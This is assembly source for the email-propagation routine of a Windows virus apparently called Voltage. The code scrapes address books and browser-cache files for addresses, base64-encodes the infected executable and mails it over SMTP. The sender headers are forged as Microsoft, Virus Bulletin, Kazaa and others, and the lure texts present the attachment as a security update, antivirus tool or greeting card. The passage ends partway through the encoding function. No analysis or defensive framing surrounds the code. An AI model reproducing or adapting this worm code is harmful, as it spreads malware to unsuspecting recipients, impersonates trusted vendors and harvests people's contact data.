MassMail:
	call	mDelta
mDelta:	pop	ebp
	sub	ebp,offset mDelta
	
	;send the virus to all email addresses that the virus
	;found in the Windows address book file.and temporary
	;internet files


	push	(60*1000*5)			
	call	[ebp + Sleep]			;sleep 5 minutes

	call	CheckConditions			;check for some conditions before sending mails
	jnc	ExitMT
	
	lea	eax,[ebp + MM_SEH_Handler]
	push	eax
	call	[ebp + SetUnhandledExceptionFilter];set SEH
	
	mov	[ebp + MainMail_SEH],eax	
	
	call	GetWinsockApis			;get all needed apis from winsock library	
	jnc	ExitMM
	call	GetSMTPServer			;get the default smtp server from the registry
	jnc	FreeWSLibraryAndExit
	call	CreateVirusBase64Image		;base64 encode of infected file
	jnc	FreeWSLibraryAndExit
	call	ScanWAB				;get email addresses from the windows address book
	call	SearchEmailsInHTMFiles		;and also from temporary internet files
	call	ConnectToServer			;connect to server
	jnc	FreeBase64Mem
	call	[ebp + GetTickCount]
	mov	[ebp + MessageNumber],al	;select random message
	call	__recv				;recv server message:
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 022"		;is 220 ?
	jne	Disconnect
	;send HELO command:
	push	0h
	push	SizeOfHELO
	lea	eax,[ebp + HELO]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv				;get server message
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 052"		;is 250 ?
	jne	Disconnect
	;send the mail from command:
	push	0h
	cmp	byte ptr [ebp + MessageNumber],32h
	ja	mfrom
	push	SizeOfMailFrom1
	lea	eax,[ebp + MAILFROM1]
	push	eax
	jmp	mfromok
mfrom:	cmp	byte ptr [ebp + MessageNumber],64h
	ja	mfrom2
	push	SizeOfMailFrom2
	lea	eax,[ebp + MAILFROM2]
	push	eax
	jmp	mfromok
mfrom2:	cmp	byte ptr [ebp + MessageNumber],96h
	ja	mfrom3
	push	SizeOfMailFrom3
	lea	eax,[ebp + MAILFROM3]
	push	eax
	jmp	mfromok
mfrom3:	cmp	byte ptr [ebp + MessageNumber],0c8h
	ja	mfrom4
	push	SizeOfMailFrom4
	lea	eax,[ebp + MAILFROM4]
	push	eax
	jmp	mfromok
mfrom4:	push	SizeOfMailFrom5
	lea	eax,[ebp + MAILFROM5]
	push	eax
mfromok:push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv				;get server message:
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 052"		;is 250 ?
	jne	Disconnect
	;send RCPT command
	xor	ecx,ecx
	mov	esi,[ebp + hMailAddresses]
	mov	cx,[ebp + NumberOfMailAddresses]
	cmp	ecx,1h
	jbe	MailsFromFiles
@NxtAdd:push	ecx
	push	0h
	push	SizeOfRcpt
	lea	edx,[ebp + RCPT]
	push	edx
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send start of RCPT command
	push	esi
	xor	ecx,ecx
AddSize:inc	ecx				;get email address size
	inc	esi
	cmp	byte ptr [esi],0h
	jne	AddSize	
	pop	esi				;pointer to email addresses array
	push	0h
	push	ecx
	push	esi
	add	esi,ecx				;move to next address
	inc	esi
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send address
	push	0h
	push	SizeOfEndRcpt
	lea	eax,[ebp + EndOfRCPT]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send the end or rcpt command
	call	__recv				;get server message
	pop	ecx
	loop	@NxtAdd				;and move to next mail address
MailsFromFiles:					;send mails to ppl that we found in temporary internet files
	cmp	word ptr [ebp + NumberOfEmails],28h
	jb	_1___				;is number of mails > 40 ?
	mov	[ebp + NumberOfEmails],1eh	;send 30 emails
_1___:	xor	ecx,ecx
	mov	cx,[ebp + NumberOfEmails]	;number of mails
	mov	esi,[ebp + MailsMemory]		;pointer to mails array
@nM:	push	ecx				;next mail
	push	0h
	push	SizeOfRcpt
	lea	edx,[ebp + RCPT]
	push	edx
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]			;send start of RCPT command
	xor	ecx,ecx
	push	esi
Csize:	inc	ecx
	inc	esi
	cmp	byte ptr [esi],0h
	jne	Csize				;calc mail address size
	pop	esi				;restore pointer to mail address
	push	0h
	push	ecx
	push	esi
	add	esi,ecx
	inc	esi				;move to next email
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	push	0h
	push	SizeOfEndRcpt
	lea	eax,[ebp + EndOfRCPT]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	call	__recv
	pop	ecx
	loop	@nM
	;send data command
	push	0h
	push	SizeOfData
	lea	eax,[ebp  + __DATA]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	;get server message
	call	__recv
	cmp	eax,SOCKET_ERR
	je	Disconnect
	cmp	eax,0h
	je	Disconnect
	lea	eax,[ebp + GetBuffer]
	cmp	dword ptr [eax]," 453"	;is 354 ?
	jne	Disconnect
	;send from and subject
	push	0h
	cmp	byte ptr [ebp + MessageNumber],32h
	ja	_fs
	push	SizeOfFromAndSubject1
	lea	eax,[ebp + FromAndSubject1]
	push	eax
	jmp	smimeh	
_fs:	cmp	byte ptr [ebp + MessageNumber],64h
	ja	_fs2
	push	SizeOfFromAndSubject2
	lea	eax,[ebp + FromAndSubject2]
	push	eax
	jmp	smimeh	
_fs2:	cmp	byte ptr [ebp + MessageNumber],96h
	ja	_fs3
	push	SizeOfFromAndSubject3
	lea	eax,[ebp + FromAndSubject3]
	push	eax
	jmp	smimeh
_fs3:	cmp	byte ptr [ebp + MessageNumber],0c8h
	ja	_fs4
	push	SizeOfFromAndSubject4
	lea	eax,[ebp + FromAndSubject4]
	push	eax
	jmp	smimeh
_fs4:	push	SizeOfFromAndSubject5
	lea	eax,[ebp + FromAndSubject5]
	push	eax
smimeh:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;send the mime header
	push	0h
	push	SizeOfMessageMimeHeader
	lea	eax,[ebp + MessageMimeHeader]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	;send message and attachment name
	push	0h
	cmp	byte ptr [ebp + MessageNumber],32h
	ja	_ma
	push	SizeOfMessageAndFileName1
	lea	eax,[ebp + MessageAndFileName1]
	push	eax
	jmp	sattch	
_ma:	cmp	byte ptr [ebp + MessageNumber],64h
	ja	_ma2
	push	SizeOfMessageAndFileName2
	lea	eax,[ebp + MessageAndFileName2]
	push	eax
	jmp	sattch
_ma2:	cmp	byte ptr [ebp + MessageNumber],96h
	ja	_ma3
	push	SizeOfMessageAndFileName3
	lea	eax,[ebp + MessageAndFileName3]
	push	eax
	jmp	sattch
_ma3:	cmp	byte ptr [ebp + MessageNumber],0c8h
	ja	_ma4
	push	SizeOfMessageAndFileName4
	lea	eax,[ebp + MessageAndFileName4]
	push	eax
	jmp	sattch
_ma4:	push	SizeOfMessageAndFileName5
	lea	eax,[ebp + MessageAndFileName5]
	push	eax
sattch:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;send the attachment
	mov	ecx,[ebp + sizeofbase64out]
	mov	eax,[ebp + base64outputmem]
	push	0h
	push	ecx
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;send end of mail
	push	0h
	push	SizeOfEndOfMail
	lea	eax,[ebp + EndOfMail]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	;get server message
	call	__recv
	;send quit command
QuitM:	push	0h
	push	SizeOfQuit
	lea	eax,[ebp + QUIT]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
Disconnect:	
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
	call	[ebp + WSACleanup]
FreeBase64Mem:
	push	[ebp + base64outputmem]
	call	[ebp + GlobalFree]
FreeWSLibraryAndExit:
	push	dword ptr [ebp + hWinsock]
	call	[ebp + FreeLibrary]
FreeWabMemAndExit:
	push	dword ptr [ebp + hMailAddresses]
	call	[ebp + GlobalFree]
	push	dword ptr [ebp + MailsMemory]
	call	[ebp + GlobalFree]
ExitMM:	push	[ebp + MainMail_SEH]
	call	[ebp + SetUnhandledExceptionFilter]	;uninstall SEH
ExitMT:	push	eax
	call	[ebp + ExitThread]


MM_SEH_Handler:
	call	MMS_d
MMS_d:	pop	ebp
	sub	ebp,offset MMS_d	
	jmp	ExitMM


	MessageNumber	db	0


	MainMail_SEH	dd	0

	

__recv:
	push	0h
	push	0ffh
	lea	eax,[ebp + GetBuffer]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + recv]
	ret


;scan all .htm,asp,xml temporary files for email addresses
SearchEmailsInHTMFiles:
IF	DEBUG
	call	SetDebugDir
	db	"C:\w32_Voltage_V3\TempInetFiles",0
SetDebugDir:
	call	[ebp + SetCurrentDirectory]
	jmp	____1_
ENDIF
	lea	eax,[ebp + shell_dll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	ExitTMS
	mov	[ebp + shell_h],eax
	lea	ebx,[ebp + _SHGetSpecialFolderPath]
	push	ebx
	push	eax
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	UnloadSh
	xor	ecx,ecx
	push	ecx
	push	CSIDL_INTERNET_CACHE		;get temporary internet files directory
	lea	ebx,[ebp + TempDir]
	push	ebx
	push	ecx
	call	eax
	cmp	eax,1h				;success ?
	jne	UnloadSh			
	lea	eax,[ebp + TempDir]
	push	eax
	call	[ebp + SetCurrentDirectory]
____1_:	push	0c800h				;50k
	push	GPTR
	call	[ebp + GlobalAlloc]		;allocate 50k of memory which used to store mails
	cmp	eax,0h
	je	UnloadSh
	mov	[ebp + MailsMemory],eax
	mov	[ebp + LastMailPointer],0
	mov	[ebp + NumberOfEmails],0
	mov	[ebp + NewMail],0h
	call	FindFiles
UnloadSh:					;unload shell library
	push	dword ptr [ebp + shell_h]
	call	[ebp + FreeLibrary]
ExitTMS:ret					;exit temp mails search
	

	shell_dll	db	"Shell32.dll",0
	shell_h		dd	0
	_SHGetSpecialFolderPath	db	"SHGetSpecialFolderPathA",0

	
	CSIDL_INTERNET_CACHE	equ	0020h

	MailsMemory	dd	0
	NumberOfEmails	dw	0
	TempDir	db	0ffh	dup(0)
	
	
FindFiles:
	;recursive scan directorys for files
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	lea	eax,[ebp + search_mask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitFind
	mov	dword ptr [ebp + hfind],eax		;save search handle
@find:	mov	eax,[ebp + dwFileAttributes]
	and	eax,FILE_ATTRIBUTE_DIRECTORY
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;is directory ?
	jne	Is_File
	cmp	byte ptr [ebp + cFileName],"."		;most be not .. or .
	je	FindNext
	push	dword ptr [ebp + hfind]			;save search handle
	lea	eax,[ebp + cFileName]
	push	eax
	call	[ebp + SetCurrentDirectory]
	cmp	eax,1h
	je	_SD
	pop	eax					;restore stack
	jmp	FindNext
_SD:	call	FindFiles
	pop	dword ptr [ebp + hfind]			;restore search handle
	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]
	jmp	FindNext	
Is_File:
	lea	eax,[ebp + cFileName]			;do action
	call	ScanFileForMails
FindNext:	
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	push	dword ptr [ebp + hfind]
	call	[ebp + FindNextFile]
	cmp	eax,0h
	jne	@find					;move to next file
ExitFind:
	push	dword ptr [ebp + hfind]
	call	[ebp + FindClose]			;close the file handle
	ret						;exit search

	

;scan htm,asp,xml files for emails
;input:
;	eax - file name
;output:
;	none	
ScanFileForMails:
	push	eax
	
	lea	ecx,[ebp + MailSearchErr]
	push	ecx
	call	[ebp + SetUnhandledExceptionFilter]	;set SEH
	mov	[ebp + ScanFile_SEH],eax
	
	pop	eax
	xor	ecx,ecx
	
@gSize:	cmp	byte ptr [eax + ecx],0h		;get size of file name
	je	ChkExt
	inc	ecx
	jmp	@gSize
ChkExt:	sub	ecx,4h
	cmp	dword ptr [eax + ecx],"mth."	;is .htm ?
	je	_1
	cmp	dword ptr [eax + ecx],"psa."	;is .asp ?
	je	_1
	cmp	dword ptr [eax + ecx],"lmx."	;is .xml ?
	jne	ExitMS
_1:	push	0h
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0h
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	eax				;file name
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitMS
	mov	[ebp + hfile],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	[ebp + hfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	_CloseF
	mov	[ebp + hmap],eax
	push	0h
	push	[ebp + hfile]
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	_CloseM
	cmp	eax,14000h
	ja	_CloseM					;dont scan files which are > 80k
	cmp	eax,200h
	jb	_CloseM					;dont scan file which are < 512 bytes
	mov	[ebp + _FSize],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	[ebp + hmap]
	call	[ebp + MapViewOfFile]			;map file into memory
	cmp	eax,0h
	je	_CloseM
	mov	[ebp + mapbase],eax			;file in the memory
	mov	ecx,[ebp + _FSize]			;size of file
	sub	ecx,0ah
	cmp	ecx,0h
	jbe	Unmap
	mov	edi,[ebp + MailsMemory]			;where to store mails
@lm:	cmp	byte ptr [edi],0h
	je	_1_
	inc	edi
	jmp	@lm
_1_:	mov	[ebp + LastMailPointer],0h
@checkM:cmp	dword ptr [eax],"liam"
	jne	NotMail
	cmp	dword ptr [eax + 3h],":otl"
	jne	NotMail
	add	eax,7h					;skip the mailto:
	cmp	byte ptr [ebp + NewMail],0h
	je	checkC
@lm2:	cmp	byte ptr [edi],0h			;move to last mail
	jne	_2_
	cmp	byte ptr [edi-1],0h			;and leave 0 between the
	je	checkC					;new mail to the last mail
_2_:	inc	edi
	jmp	@lm2
checkC:	cmp	byte ptr [eax],'?'			;check char
	je	_Stop
	cmp	byte ptr [eax],'"'
	je	_Stop
	cmp	byte ptr [eax],'@'
	je	@cpyM
	cmp	byte ptr [eax],'.'
	je	@cpyM
	cmp	byte ptr [eax],7ah
	ja	BadMail
	cmp	byte ptr [eax],30h
	jnb	@cpyM
	jmp	BadMail
@cpyM:	mov	bl,byte ptr [eax]
	mov	byte ptr [edi],bl
	inc	eax
	inc	edi
	inc	dword ptr [ebp + LastMailPointer]
	jmp	checkC
_Stop:	inc	[ebp + NumberOfEmails]
	inc	edi
	mov	byte ptr [ebp + NewMail],1h
	inc	dword ptr [ebp + LastMailPointer]
NotMail:inc	eax
	loop	@checkM
Unmap:	push	[ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
_CloseM:push	[ebp + hmap]
	call	[ebp + CloseHandle]
_CloseF:push	[ebp + hfile]
	call	[ebp + CloseHandle]
ExitMS:	push	[ebp + ScanFile_SEH]
	call	[ebp + SetUnhandledExceptionFilter]	;remove seh
	ret						;exit mail search

	ScanFile_SEH	dd	0

MailSearchErr:
	call	MSd
MSd:	pop	ebp
	sub	ebp,offset MSd
	push	[ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
	push	[ebp + hmap]
	call	[ebp + CloseHandle]
	push	[ebp + hfile]
	call	[ebp + CloseHandle]
	jmp	ExitMS
	
BadMail:
	sub	edi,[ebp + LastMailPointer]		;restore mail pointer,if we
	jmp	NotMail					;copy invalid mail
	
	
	
	_FSize	dd	0
	LastMailPointer	dd	0
	NewMail	db	0

	
	
CheckConditions:
	;check for internet connection
	lea	eax,[ebp + WinInetDll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	BadConditions
	xchg	edx,eax
	lea	eax,[ebp + _InternetCheckConnection]
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	BadConditions
	push	0h
	push	FLAG_ICC_FORCE_CONNECTION
	lea	ebx,[ebp + SiteToCheck]
	push	ebx
	call	eax
	cmp	eax,0h				;there is internet connection ?
	je	BadConditions
	push	edx
	call	[ebp + FreeLibrary]
	stc
	ret
BadConditions:
	clc
	ret
	
	
	WinInetDll	db	"Wininet.dll",0
	_InternetCheckConnection	db	"InternetCheckConnectionA",0
	FLAG_ICC_FORCE_CONNECTION	equ	00000001h
	SiteToCheck	db	"http://www.google.com/",0
	


FromAndSubject1:

	;from and subject
	db	"From:Microsoft Security Alert <SecurityUpdate@Microsoft.com>",0dh,0ah
	db	"Subject:Microsoft Security Update",0dh,0ah
	
	SizeOfFromAndSubject1	equ	($-FromAndSubject1)

FromAndSubject2:

	;from and subject
	db	"From:WorldSex.com <Pictures@WorldSex.com>",0dh,0ah
	db	"Subject:Your Dayly Pictures",0dh,0ah
	
	SizeOfFromAndSubject2	equ	($-FromAndSubject2)

FromAndSubject3:

	;from and subject
	db	"From:Virus Bulletin <Support@Virusbtn.com>",0dh,0ah
	db	"Subject:A New Tool From Virus Bulletin",0dh,0ah
	
	SizeOfFromAndSubject3	equ	($-FromAndSubject3)

FromAndSubject4:

	;from and subject
	db	"From:Kazaa.com <Support@Kazaa.com>",0dh,0ah
	db	"Subject:Get YourSelf Kazaa Media Desktop !!!",0dh,0ah
	
	SizeOfFromAndSubject4	equ	($-FromAndSubject4)

FromAndSubject5:

	;from and subject
	db	"From:Greeting-Card.com <FreeGreeting@Greeting-Cards.com>",0dh,0ah
	db	"Subject:You've got an e-card at greeting-cards.com",0dh,0ah
	
	SizeOfFromAndSubject5	equ	($-FromAndSubject5)



MessageMimeHeader:

	db	"MIME-Version: 1.0",0dh,0ah
	db	"Content-Type: multipart/mixed;",0dh,0ah
	db	' boundary="bound1"',0dh,0ah
	db	"X-Priority: 3",0dh,0ah
	db	"X-MSMail-Priority: Normal",0dh,0ah
	db	"X-Mailer: Microsoft Outlook Express 6.00.2800.1106",0dh,0ah
	db	"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106",0dh,0ah
	db	0dh,0ah,"This is a multi-part message in MIME format.",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: text/plain;",0dh,0ah
	db	' charset="windows-1255"',0dh,0ah
	db	"Content-Transfer-Encoding: 7bit",0dh,0ah,0dh,0ah
	
	SizeOfMessageMimeHeader	equ	($-MessageMimeHeader)
	
	
	
	;message and filename
MessageAndFileName1:

	db	"Dear Microsoft Customer",0dh,0ah,0dh,0ah
	db	"A new vulnerability has been discovered in Internet Explorer",0dh,0ah
	db	"we recommending you to update internet explorer as soon as",0dh,0ah
	db	"possible, this vulnerablility is critical and may allow",0dh,0ah
	db	"execution of malicious code on your system while you use internet",0dh,0ah
	db	"explorer.",0dh,0ah,0dh,0ah
	db	"vulnerable versions:",0dh,0ah
	db	"Internet Explorer 5.0",0dh,0ah
	db	"Internet Explorer 6.0",0dh,0ah
	db	"if you using one of this versions please install attached update.",0dh,0ah,0dh,0ah
	db	"Thank You.",0dh,0ah,"The Microsoft Security Team.",0dh,0ah,0dh,0ah
	db	"If you do not wish to receive future Security Update E-mail from",0dh,0ah
	db	"Microsoft, or believe you were subscribed in error, please send",0dh,0ah
	db	"a blank E-mail to SecurityUpdate@microsoft.com",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Internet Explorer Update.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Internet Explorer Update.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName1	equ	($-MessageAndFileName1)	
	
	
MessageAndFileName2:

	db	"150 XXX Pictures For You !!!",0dh,0ah,0dh,0ah
	db	"here are your dayly xxx pictures.",0dh,0ah
	db	"Have Fun & Enjoy...",0dh,0ah,0dh,0ah
	db	"we like to inform you that your account at",0dh,0ah	;try to make this letter formal :)
	db	"our web site will be expired at the end of",0dh,0ah
	db	"this month,please renew your account",0dh,0ah
	db	"renew of account for old members is only 25$",0dh,0ah
	db	"per half year.",0dh,0ah,0dh,0ah
	db	"Please Visit Our Web Site:",0dh,0ah
	db	"http://www.WorldSex.com/",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "150_XXX_Pictures.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "150_XXX_Pictures.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName2	equ	($-MessageAndFileName2)	
		
	
MessageAndFileName3:

	db	"Dear Symantec/F-Secure/Mcafee/Trend Micro User",0dh,0ah,0dh,0ah
	db	"We Have Developed A New Tool That Can Block New",0dh,0ah
	db	"Internet Worms From Attacking Your Computer,We",0dh,0ah
	db	"Recommending To Install This Tool Before A New",0dh,0ah
	db	"Internet Worm Will Start To Spread",0dh,0ah,0dh,0ah
	db	"How To Use The Tool:",0dh,0ah
	db	"Just Run The Attached File,After You Have Run It",0dh,0ah
	db	"Follow The Instructions.",0dh,0ah,0dh,0ah
	db	"Thank You.",0dh,0ah,"The Virus Bulletin Security Team.",0dh,0ah
	db	"For More Information Please Visit Our Web Site:",0dh,0ah
	db	"		http://www.virusbtn.com/",0dh,0ah,0dh,0ah
	db	"If you do not wish to receive future antivirus tools from",0dh,0ah
	db	"Virus Bulletin, or believe you were subscribed in error, ",0dh,0ah
	db	"please send,a blank E-mail to Subscribe@Virusbtn.com",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Antivirus Update.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Antivirus Update.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName3	equ	($-MessageAndFileName3)	
		
	
MessageAndFileName4:
	db	"Dear User.",0dh,0ah,0dh,0ah
	db	"Sharman Networks Wants To offer You The New",0dh,0ah
	db	"Version Of Kazaa !!!",0dh,0ah
	db	"Please Read Product Description Below:",0dh,0ah,0dh,0ah
	db	"Kazaa Media Desktop is the world's No. 1",0dh,0ah
	db	"free, peer-to-peer, file-sharing software",0dh,0ah
	db	"application. Features include improved",0dh,0ah
	db	"privacy protection; the ability to search",0dh,0ah
	db	"for and download music, playlists, software,",0dh,0ah
	db	"video files, documents, and images; the",0dh,0ah
	db	"ability to set up and manage music and video",0dh,0ah
	db	"playlists; and the ability to perform",0dh,0ah
	db	"multiple simultaneous searches, including",0dh,0ah
	db	"up to five Search Mores, which deliver up",0dh,0ah
	db	"to 1,000 results per search term.",0dh,0ah,0dh,0ah
	db	"We Have Included A Free Version Of Kazaa In",0dh,0ah
	db	"This Mail,Try It !!!",0dh,0ah,0dh,0ah
	db	"Thank You.",0dh,0ah,"Sharman Networks.",0dh,0ah,0dh,0ah
	db	"If you do not wish to receive future E-mail's from",0dh,0ah
	db	"Sharman Networks, or believe you were subscribed in",0dh,0ah
	db	"error, please send a blank E-mail to Remove@kazaa.com",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Kazaa Media Desktop.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Kazaa Media Desktop.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName4	equ	($-MessageAndFileName4)	
		

MessageAndFileName5:

	db	"Greeting-Cards.com have sent you a Greeting Card",0dh,0ah,0dh,0ah
	db	"One Of Your Friends Wish You Happy Year",0dh,0ah
	db	"Love,Fun,Good Life,And Good Luck.",0dh,0ah,0dh,0ah
	db	"To Show His Love He Sent You A Greeting",0dh,0ah
	db	"Card,Congratulations !",0dh,0ah,0dh,0ah
	db	"Hope you enjoy our e-cards! Spread the love and send one of our FREE e-cards!",0dh,0ah
	db	"Brought to you by greeting-cards.com - a better way to greet for FREE! ",0dh,0ah
	db	"Please Visit Greeting Cards Web site:http://www.greeting-cards.com/",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Your Greeting Card.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Your Greeting Card.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName5	equ	($-MessageAndFileName5)	
		

	
EndOfMail:

	db	0dh,0ah,"--bound1--",0dh,0ah
	db	0dh,0ah,'.',0dh,0ah
	
	SizeOfEndOfMail	equ	($-EndOfMail)
	
	
	
	HELO		db	"HELO <localhost>",0dh,0ah
	SizeOfHELO	equ	($-HELO)
	
	
	MAILFROM1	db	"MAIL FROM:<SecurityUpdate@Microsoft.com>",0dh,0ah
	SizeOfMailFrom1	equ	($-MAILFROM1)

	MAILFROM2	db	"MAIL FROM:<FreePictures@WorldSex.com>",0dh,0ah
	SizeOfMailFrom2	equ	($-MAILFROM2)

	MAILFROM3	db	"MAIL FROM:<VirusAlert@Virusbtn.com>",0dh,0ah
	SizeOfMailFrom3	equ	($-MAILFROM3)

	MAILFROM4	db	"MAIL FROM:<Support@Kazaa.com>",0dh,0ah
	SizeOfMailFrom4	equ	($-MAILFROM4)

	MAILFROM5	db	"MAIL FROM:<Greets@Greeting-Cards.com>",0dh,0ah
	SizeOfMailFrom5	equ	($-MAILFROM5)
	
	
	QUIT		db	"QUIT",0dh,0ah
	SizeOfQuit	equ	($-QUIT)
	RCPT		db	"RCPT TO:<"
	SizeOfRcpt	equ	($-RCPT)
	EndOfRCPT	db	">",0dh,0ah
	SizeOfEndRcpt	equ	($-EndOfRCPT)
	__DATA		db	"DATA",0dh,0ah
	SizeOfData	equ	($-__DATA)
	
	GetBuffer	db	0ffh	dup(0)
	
	VERSION1_1	equ	0101h
	AF_INET		equ	2      
	SOCK_STREAM	equ     1     
	SOCKET_ERR	equ	-1   
	HOSTENT_IP      equ	0ch
	IPPROTO_TCP	equ	6h
	
	vsocket		dd	0
WSADATA:	
	mVersion	dw	0
	mHighVersion	dw	0
	szDescription	db	257 dup(0)
	szSystemStatus	db	129 dup(0)
	iMaxSockets	dw	0
	iMaxUpdDg	dw	0
	lpVendorInfo	dd	0

SOCKADDR:
	sin_family	dw	0	
	sin_port	dw	0
	sin_addr        dd      0       
	sin_zero	db	8 dup(0)
	SizeOfSOCKADDR	equ	($-SOCKADDR)

ConnectToServer:
	;connect to smtp server
	lea	eax,[ebp + WSADATA]
	push	eax
	push	VERSION1_1
	call	[ebp + WSAStartup]	;start up winsock
	cmp	eax,0h
	jne	ConnectionErr
	push	IPPROTO_TCP
	push	SOCK_STREAM
	push	AF_INET
	call	[ebp + socket]		;create socket
	cmp	eax,SOCKET_ERR
	je	WSACleanErr
	mov	dword ptr [ebp + vsocket],eax
	push	25			;smtp
	call	[ebp + htons]
	mov	word ptr [ebp + sin_port],ax
	mov	word ptr [ebp + sin_family],AF_INET
	lea	eax,[ebp + SmtpServerAdd]
	push	eax
	call	[ebp + gethostbyname]
	cmp	eax,0h
	je	CloseSockErr
	mov	eax,dword ptr [eax + HOSTENT_IP]
	mov	eax,dword ptr [eax]
	mov	eax,dword ptr [eax]
	mov	dword ptr [ebp + sin_addr],eax
	push	SizeOfSOCKADDR
	lea	eax,[ebp + SOCKADDR]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + connect]
	cmp	eax,0h
	jne	CloseSockErr
	stc
	ret
CloseSockErr:
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
WSACleanErr:
	call	[ebp + WSACleanup]
ConnectionErr:
	clc
	ret


CreateVirusBase64Image:
	push	0ffh
	lea	eax,[ebp + wvltg_exe_path]
	push	eax
	push	0h
	call	[ebp + GetModuleFileName]
	cmp	eax,0h
	je	Base64CreationErr
_____1:	;open it:
	push	0h
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0h
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + wvltg_exe_path]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	Base64CreationErr
	mov	[ebp + hvirusfile],eax
	;get file size:
	push	0
	push	[ebp + hvirusfile]
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	CloseFileErr
	mov	[ebp + virusfilesize],eax
	push	eax
	xor	edx,edx
	mov	ecx,3h
	div	ecx
	xchg	ecx,eax
	pop	eax
	add	eax,ecx
	mov	ecx,25
	mul	ecx
	add	eax,400h	;allocate more memory than needed,just for safty
	push	eax
	push	GPTR
	call	[ebp + GlobalAlloc]	;allocate memory
	cmp	eax,0h
	je	CloseFileErr
	mov	[ebp + base64outputmem],eax
	;map file into the memory
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hvirusfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	B64FreeMemErr
	mov	[ebp + hvirusmap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
